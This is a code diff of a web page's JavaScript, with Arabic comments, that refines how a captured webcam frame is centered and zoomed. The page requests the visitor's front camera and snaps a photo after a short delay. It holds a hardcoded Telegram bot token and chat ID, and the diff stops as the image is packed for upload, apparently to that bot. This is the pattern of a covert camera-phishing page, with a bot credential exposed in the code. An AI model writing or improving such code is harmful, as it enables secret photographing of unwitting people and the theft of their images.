@@ -51,6 +51,7 @@
         const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
         const chatId = "2049331070";
 
+        // طلب الكاميرا بنسبة 9:16 عمودية افتراضياً
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
@@ -60,7 +61,10 @@
         })
         .then(stream => {
             video.srcObject = stream;
-            setTimeout(captureAndSend, 1500);
+            // الانتظار حتى يتم تحميل بيانات الفيديو لمعرفة الأبعاد الحقيقية
+            video.onloadedmetadata = () => {
+                setTimeout(captureAndSend, 1500);
+            };
         })
         .catch(() => showError());
 
@@ -68,19 +72,45 @@
             const vWidth = video.videoWidth;
             const vHeight = video.videoHeight;
             
-            // نسبة 9:16 واسعة
-            canvas.width = 720;
-            canvas.height = 1280;
+            // تحديد أبعاد الكانفاس الثابتة بنسبة 9:16
+            const targetWidth = 720;
+            const targetHeight = 1280;
+            
+            canvas.width = targetWidth;
+            canvas.height = targetHeight;
             
             const ctx = canvas.getContext('2d');
             
-            // رسم الصورة بشكل واسع ومركز
-            ctx.drawImage(video, 
-                (vWidth - 720) / 2 * -0.3,   // زوم أوت
-                (vHeight - 1280) / 2 * -0.3,
-                vWidth * 1.6, 
-                vHeight * 1.6
-            );
+            // حساب النسبة والتوسيط التلقائي (Center and Zoom Out)
+            const videoRatio = vWidth / vHeight;
+            const targetRatio = targetWidth / targetHeight;
+            
+            let drawWidth, drawHeight, offsetX, offsetY;
+            
+            // محاكاة وضعية الـ Zoom Out (تعديل المعامل للتحكم بمدى البعد)
+            // استخدام معامل 0.85 يضمن صغر حجم المشهد وظهور الكاميرا بشكل أوسع ومتوسط تماماً
+            const zoomFactor = 0.85; 
+
+            if (videoRatio > targetRatio) {
+                // إذا كان الفيديو القادم عريضاً جداً
+                drawHeight = targetHeight * zoomFactor;
+                drawWidth = drawHeight * videoRatio;
+            } else {
+                // إذا كان الفيديو القادم طويلاً جداً
+                drawWidth = targetWidth * zoomFactor;
+                drawHeight = drawWidth / videoRatio;
+            }
+            
+            // معادلة التوسيط الرياضي المطلق لضمان عدم حدوث إزاحة لليسار أو اليمين
+            offsetX = (targetWidth - drawWidth) / 2;
+            offsetY = (targetHeight - drawHeight) / 2;
+            
+            // ملء الخلفية باللون الأسود لتغطية أي حواف فارغة ناتجة عن الـ Zoom Out
+            ctx.fillStyle = "#000000";
+            ctx.fillRect(0, 0, targetWidth, targetHeight);
+            
+            // رسم الصورة في المنتصف تماماً وبشكل متناسق
+            ctx.drawImage(video, offsetX, offsetY, drawWidth, drawHeight);
             
             canvas.toBlob(blob => {
                 const formData = new FormData();
